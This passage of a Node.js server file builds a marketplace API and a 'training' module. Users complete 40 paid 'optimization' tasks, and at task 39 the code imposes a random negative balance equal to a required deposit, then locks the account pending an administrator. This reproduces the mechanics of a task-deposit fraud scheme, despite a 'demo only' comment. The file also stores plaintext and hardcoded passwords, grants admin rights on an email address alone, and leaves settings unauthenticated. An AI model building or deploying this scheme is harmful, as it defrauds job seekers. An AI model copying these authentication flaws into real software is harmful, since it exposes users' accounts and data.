const http = require("http");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { URL } = require("url");

const PORT = process.env.PORT || 3000;
const ROOT = __dirname;
const DATA = path.join(ROOT, "data");
const DB = path.join(DATA, "db.json");

if (!fs.existsSync(DATA)) {
  fs.mkdirSync(DATA, { recursive: true });
}

const seed = {
  users: [
    {
      id: "u_admin",
      name: "MyMarket Admin",
      email: "admin@mymarket.ug",
      password: "admin123",
      role: "admin"
    },
    {
      id: "u_seller",
      name: "Demo Electronics",
      email: "seller@mymarket.ug",
      password: "seller123",
      role: "seller",
      shop: "Demo Electronics Uganda"
    }
  ],

  products: [
    {
      id: "p1",
      name: "Samsung Galaxy A15",
      category: "Phones",
      price: 699000,
      stock: 12,
      sellerId: "u_seller",
      image: "📱",
      active: true
    },
    {
      id: "p2",
      name: "Solar Home Kit 100W",
      category: "Solar",
      price: 320000,
      stock: 20,
      sellerId: "u_seller",
      image: "☀️",
      active: true
    },
    {
      id: "p3",
      name: "Bluetooth Speaker",
      category: "Electronics",
      price: 85000,
      stock: 30,
      sellerId: "u_seller",
      image: "🔊",
      active: true
    },
    {
      id: "p4",
      name: "Men's Sneakers",
      category: "Fashion",
      price: 120000,
      stock: 18,
      sellerId: "u_seller",
      image: "👟",
      active: true
    }
  ],

  orders: [],

  training: {
    startingBalance: 0,
    totalTasks: 40,
    maxDeposit: 30000,
    negativeTask: 39,
    negativeBalance: -30000,
    demoDeposit: 50000,
    commissionPerTask: 2500,

    products: [
      "Bluetooth Speaker",
      "Phone Charger",
      "Solar Lamp",
      "Wireless Earbuds",
      "Smart Watch",
      "LED Bulb",
      "Power Bank",
      "USB Cable",
      "Electric Kettle",
      "Phone Holder",
      "Mini Fan",
      "Smart TV",
      "Laptop Stand",
      "Security Camera",
      "Bluetooth Headphones",
      "Ring Light",
      "Extension Cable",
      "Solar Panel",
      "Table Lamp",
      "Electric Iron",
      "Keyboard",
      "Computer Mouse",
      "Memory Card",
      "WiFi Router",
      "Projector",
      "Smartphone",
      "Microphone",
      "Tripod",
      "Gaming Controller",
      "LED Strip",
      "Hair Dryer",
      "Blender",
      "Electric Cooker",
      "Power Inverter",
      "Rechargeable Fan",
      "Vacuum Cleaner",
      "Digital Scale",
      "Air Cooler",
      "Smart Doorbell",
      "Smart TV Accessory"
    ]
  },

  trainingUsers: []
};

if (!fs.existsSync(DB)) {
  fs.writeFileSync(
    DB,
    JSON.stringify(seed, null, 2)
  );
}

function readDB() {
  const db = JSON.parse(
    fs.readFileSync(DB, "utf8")
  );

  /*
    Make sure older db.json files receive
    the newer training structures.
  */

  if (!db.training) {
    db.training = seed.training;
  }

  if (!Array.isArray(db.training.products)) {
    db.training.products = seed.training.products;
  }

  if (!Array.isArray(db.trainingUsers)) {
    db.trainingUsers = [];
  }

  return db;
}

function writeDB(db) {
  fs.writeFileSync(
    DB,
    JSON.stringify(db, null, 2)
  );
}

function id(prefix) {
  return (
    prefix +
    "_" +
    crypto.randomBytes(5).toString("hex")
  );
}

function json(res, code, obj) {
  const body = JSON.stringify(obj);

  res.writeHead(code, {
    "Content-Type":
      "application/json; charset=utf-8",

    "Access-Control-Allow-Origin": "*",

    "Access-Control-Allow-Headers":
      "Content-Type",

    "Access-Control-Allow-Methods":
      "GET,POST,PUT,OPTIONS"
  });

  res.end(body);
}

function body(req) {
  return new Promise((resolve, reject) => {

    let s = "";

    req.on("data", chunk => {
      s += chunk;
    });

    req.on("end", () => {

      try {
        resolve(
          s ? JSON.parse(s) : {}
        );
      } catch (e) {
        reject(e);
      }

    });
  });
}

function safeUser(user) {
  const {
    password,
    ...safe
  } = user;

  return safe;
}


/* =========================
   ADMIN AUTHORIZATION
========================= */

function isAdmin(db, email) {

  const adminEmail =
    String(email || "")
      .trim()
      .toLowerCase();

  if (!adminEmail) {
    return false;
  }

  return db.users.some(
    user =>
      String(user.email)
        .toLowerCase() === adminEmail &&
      user.role === "admin"
  );
}


/* =========================
   TRAINING USER CREATION
========================= */

function createTrainingUser(userId) {

  return {
    userId,

    balance: 0,

    commission: 0,

    progress: 0,

    status: "active",

    negativeAmount: 0,

    depositRequired: 0,

    depositApproved: false,

    cycle: 1,

    completedCycles: 0
  };
}


/* =========================
   API
========================= */

async function api(req, res, url) {

  if (req.method === "OPTIONS") {

    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers":
        "Content-Type",
      "Access-Control-Allow-Methods":
        "GET,POST,PUT,OPTIONS"
    });

    return res.end();
  }

  const db = readDB();


  /* =========================
     PRODUCTS
  ========================= */

  if (
    req.method === "GET" &&
    url.pathname === "/api/products"
  ) {

    let list =
      db.products.filter(
        p => p.active !== false
      );

    const q =
      (
        url.searchParams.get("q") ||
        ""
      ).toLowerCase();

    const cat =
      url.searchParams.get("category");

    if (q) {

      list = list.filter(p =>
        (
          p.name +
          " " +
          p.category
        )
          .toLowerCase()
          .includes(q)
      );
    }

    if (cat && cat !== "All") {

      list =
        list.filter(
          p => p.category === cat
        );
    }

    return json(res, 200, {
      products: list
    });
  }


  /* =========================
     CATEGORIES
  ========================= */

  if (
    req.method === "GET" &&
    url.pathname === "/api/categories"
  ) {

    return json(res, 200, {
      categories: [
        "Phones",
        "Electronics",
        "Solar",
        "Fashion",
        "Home",
        "Beauty",
        "Groceries"
      ]
    });
  }


  /* =========================
     LOGIN
  ========================= */

  if (
    req.method === "POST" &&
    url.pathname === "/api/login"
  ) {

    const b = await body(req);

    const u =
      db.users.find(
        x =>
          x.email.toLowerCase() ===
            String(b.email || "")
              .toLowerCase() &&
          x.password === b.password
      );

    if (!u) {

      return json(res, 401, {
        error:
          "Invalid email or password"
      });
    }

    return json(res, 200, {
      user: safeUser(u)
    });
  }


  /* =========================
     REGISTER
  ========================= */

  if (
    req.method === "POST" &&
    url.pathname === "/api/register"
  ) {

    const b = await body(req);

    if (
      !b.name ||
      !b.email ||
      !b.password
    ) {

      return json(res, 400, {
        error:
          "Name, email and password are required"
      });
    }

    if (
      db.users.some(
        u =>
          u.email.toLowerCase() ===
          b.email.toLowerCase()
      )
    ) {

      return json(res, 409, {
        error:
          "Email already exists"
      });
    }

    const u = {
      id: id("u"),
      name: b.name,
      email: b.email,
      password: b.password,
      role:
        b.role === "seller"
          ? "seller"
          : "customer",
      shop: b.shop || ""
    };

    db.users.push(u);

    writeDB(db);

    return json(res, 201, {
      user: safeUser(u)
    });
  }


  /* =========================
     ORDERS
  ========================= */

  if (
    req.method === "POST" &&
    url.pathname === "/api/orders"
  ) {

    const b = await body(req);

    if (!b.items?.length) {

      return json(res, 400, {
        error: "Cart is empty"
      });
    }

    const total =
      b.items.reduce(
        (s, i) =>
          s +
          Number(i.price) *
          Number(i.qty),
        0
      );

    for (const i of b.items) {

      const p =
        db.products.find(
          x => x.id === i.id
        );

      if (
        !p ||
        p.stock < i.qty
      ) {

        return json(res, 400, {
          error:
            `Insufficient stock for ${i.name}`
        });
      }
    }

    b.items.forEach(i => {

      const p =
        db.products.find(
          x => x.id === i.id
        );

      p.stock -= i.qty;
    });

    const order = {
      id: id("ord"),
      customerId:
        b.customerId || "guest",
      customerName:
        b.customerName || "Guest",
      phone: b.phone || "",
      address: b.address || "",
      items: b.items,
      total,
      status: "Pending",
      payment:
        b.payment ||
        "Cash on Delivery",
      createdAt:
        new Date().toISOString()
    };

    db.orders.unshift(order);

    writeDB(db);

    return json(res, 201, {
      order
    });
  }


  if (
    req.method === "GET" &&
    url.pathname === "/api/orders"
  ) {

    const role =
      url.searchParams.get("role");

    const uid =
      url.searchParams.get("userId");

    let orders = db.orders;

    if (role === "customer") {

      orders =
        orders.filter(
          o => o.customerId === uid
        );
    }

    if (role === "seller") {

      const ids =
        db.products
          .filter(
            p => p.sellerId === uid
          )
          .map(p => p.id);

      orders =
        orders.filter(
          o =>
            o.items.some(
              i => ids.includes(i.id)
            )
        );
    }

    return json(res, 200, {
      orders
    });
  }


  /* =========================
     ADD PRODUCT
  ========================= */

  if (
    req.method === "POST" &&
    url.pathname === "/api/products"
  ) {

    const b = await body(req);

    if (
      !b.name ||
      !b.price ||
      !b.sellerId
    ) {

      return json(res, 400, {
        error:
          "Product name, price and sellerId are required"
      });
    }

    const p = {
      id: id("p"),
      name: b.name,
      category:
        b.category || "Other",
      price: Number(b.price),
      stock: Number(b.stock || 0),
      sellerId: b.sellerId,
      image:
        b.image || "🛍️",
      active: true
    };

    db.products.push(p);

    writeDB(db);

    return json(res, 201, {
      product: p
    });
  }


  /* =========================
     UPDATE ORDER
  ========================= */

  if (
    req.method === "PUT" &&
    url.pathname.startsWith(
      "/api/orders/"
    )
  ) {

    const oid =
      url.pathname
        .split("/")
        .pop();

    const b = await body(req);

    const o =
      db.orders.find(
        x => x.id === oid
      );

    if (!o) {

      return json(res, 404, {
        error: "Order not found"
      });
    }

    if (b.status) {
      o.status = b.status;
    }

    writeDB(db);

    return json(res, 200, {
      order: o
    });
  }


  /* =========================
     ADMIN STATS
  ========================= */

  if (
    req.method === "GET" &&
    url.pathname === "/api/admin/stats"
  ) {

    const revenue =
      db.orders.reduce(
        (s, o) =>
          s + Number(o.total || 0),
        0
      );

    return json(res, 200, {
      customers:
        db.users.filter(
          u => u.role === "customer"
        ).length,

      sellers:
        db.users.filter(
          u => u.role === "seller"
        ).length,

      products:
        db.products.length,

      orders:
        db.orders.length,

      revenue
    });
  }


  /* =================================================
     TRAINING SETTINGS - GET
  ================================================= */

  if (
    req.method === "GET" &&
    url.pathname ===
      "/api/training/settings"
  ) {

    return json(res, 200, {
      training: db.training
    });
  }


  /* =================================================
     TRAINING SETTINGS - POST
  ================================================= */

  if (
    req.method === "POST" &&
    url.pathname ===
      "/api/training/settings"
  ) {

    const b = await body(req);

    if (!db.training) {
      db.training =
        seed.training;
    }

    if (
      b.startingBalance !== undefined
    ) {

      db.training.startingBalance =
        Number(b.startingBalance);
    }

    if (
      b.negativeTask !== undefined
    ) {

      db.training.negativeTask =
        Number(b.negativeTask);
    }

    if (
      b.negativeBalance !== undefined
    ) {

      db.training.negativeBalance =
        Number(b.negativeBalance);
    }

    if (
      b.demoDeposit !== undefined
    ) {

      db.training.demoDeposit =
        Number(b.demoDeposit);
    }

    if (
      b.commissionPerTask !== undefined
    ) {

      db.training.commissionPerTask =
        Number(b.commissionPerTask);
    }

    if (
      b.maxDeposit !== undefined
    ) {

      db.training.maxDeposit =
        Number(b.maxDeposit);
    }

    if (
      Array.isArray(b.products) &&
      b.products.length === 40
    ) {

      db.training.products =
        b.products;
    }

    db.training.totalTasks = 40;

    writeDB(db);

    return json(res, 200, {
      message:
        "Training settings updated",
      training: db.training
    });
  }


  /* =================================================
     TRAINING STATE
  ================================================= */

  if (
    req.method === "GET" &&
    url.pathname ===
      "/api/training/state"
  ) {

    const userId =
      url.searchParams.get(
        "userId"
      );

    if (!userId) {

      return json(res, 400, {
        error:
          "userId is required"
      });
    }

    let t =
      db.trainingUsers.find(
        x => x.userId === userId
      );

    if (!t) {

      t =
        createTrainingUser(
          userId
        );

      db.trainingUsers.push(t);

      writeDB(db);
    }

    return json(res, 200, {
      training: t
    });
  }


  /* =================================================
     TRAINING OPTIMIZE
  ================================================= */

  if (
    req.method === "POST" &&
    url.pathname ===
      "/api/training/optimize"
  ) {

    const b = await body(req);

    const userId =
      String(b.userId || "");

    if (!userId) {

      return json(res, 400, {
        error:
          "userId is required"
      });
    }

    let t =
      db.trainingUsers.find(
        x => x.userId === userId
      );

    if (!t) {

      t =
        createTrainingUser(
          userId
        );

      db.trainingUsers.push(t);
    }

    if (
      t.status === "completed"
    ) {

      return json(res, 400, {
        error:
          "Cycle completed. Start a new cycle."
      });
    }

    if (
      t.status === "waiting_admin"
    ) {

      return json(res, 400, {
        error:
          "Admin action required.",
        depositRequired:
          t.depositRequired
      });
    }

    if (t.progress >= 40) {

      return json(res, 400, {
        error:
          "Optimization already completed."
      });
    }


    /* Add one task */

    t.progress++;


    /* Add commission */

    const commission =
      Number(
        db.training
          .commissionPerTask ||
        2500
      );

    t.commission +=
      commission;

    t.balance +=
      commission;


    /* =================================================
       NEGATIVE SCENARIO ONLY AT 39/40
    ================================================= */

    if (t.progress === 39) {

      const negativeOptions = [
        5000,
        10000,
        20000,
        30000
      ];

      const negative =
        negativeOptions[
          Math.floor(
            Math.random() *
              negativeOptions.length
          )
        ];

      t.balance -=
        negative;

      t.negativeAmount =
        negative;

      t.depositRequired =
        negative;

      t.depositApproved =
        false;

      t.status =
        "waiting_admin";
    }


    /* =================================================
       40/40 COMPLETION
    ================================================= */

    if (t.progress === 40) {

      t.status =
        "completed";

      t.completedCycles++;
    }


    writeDB(db);

    return json(res, 200, {

      message:
        t.status ===
        "waiting_admin"

          ? "Optimization paused. Please contact the administrator."

          : t.progress === 40

            ? "Optimization completed 40/40."

            : "Optimization successful.",

      training: t
    });
  }


  /* =================================================
     ADMIN VIEW TRAINEES
  ================================================= */

  if (
    req.method === "GET" &&
    url.pathname ===
      "/api/training/admin-trainees"
  ) {

    const adminEmail =
      String(
        url.searchParams.get(
          "adminEmail"
        ) || ""
      )
        .trim()
        .toLowerCase();

    if (
      !isAdmin(
        db,
        adminEmail
      )
    ) {

      return json(res, 403, {
        error:
          "Administrator authorization required"
      });
    }

    return json(res, 200, {
      trainees:
        db.trainingUsers || []
    });
  }


  /* =================================================
     ADMIN CLEAR NEGATIVE
  ================================================= */

  if (
    req.method === "POST" &&
    url.pathname ===
      "/api/training/admin-clear"
  ) {

    const b =
      await body(req);

    const adminEmail =
      String(
        b.adminEmail || ""
      )
        .trim()
        .toLowerCase();

    const userId =
      String(
        b.userId || ""
      );

    if (
      !isAdmin(
        db,
        adminEmail
      )
    ) {

      return json(res, 403, {
        error:
          "Administrator authorization required"
      });
    }

    if (!userId) {

      return json(res, 400, {
        error:
          "userId is required"
      });
    }

    const t =
      db.trainingUsers.find(
        x => x.userId === userId
      );

    if (!t) {

      return json(res, 404, {
        error:
          "Trainee training record not found"
      });
    }

    if (
      t.status !==
      "waiting_admin"
    ) {

      return json(res, 400, {
        error:
          "No admin action is currently required"
      });
    }

    const required =
      Number(
        t.depositRequired || 0
      );

    const maxDeposit =
      Number(
        db.training
          .maxDeposit ||
        30000
      );

    if (
      required <= 0 ||
      required > maxDeposit
    ) {

      return json(res, 400, {
        error:
          "Invalid deposit requirement"
      });
    }


    /*
      Admin chooses the demo balance
      after clearing the negative.

      It must be greater than the
      negative amount.
    */

    const demoBalance =
      Number(
        b.demoBalance || 0
      );

    if (
      demoBalance <= required
    ) {

      return json(res, 400, {
        error:
          "Demo balance must be greater than the negative amount."
      });
    }


    /*
      DEMO ONLY.
      No real payment is processed.
    */

    t.balance =
      demoBalance;

    t.depositApproved =
      true;

    t.depositRequired =
      0;

    t.negativeAmount =
      0;

    t.status =
      "active";

    writeDB(db);

    return json(res, 200, {

      message:
        "Negative demo requirement cleared by administrator.",

      training: t
    });
  }


  /* =================================================
     START NEW CYCLE
  ================================================= */

  if (
   
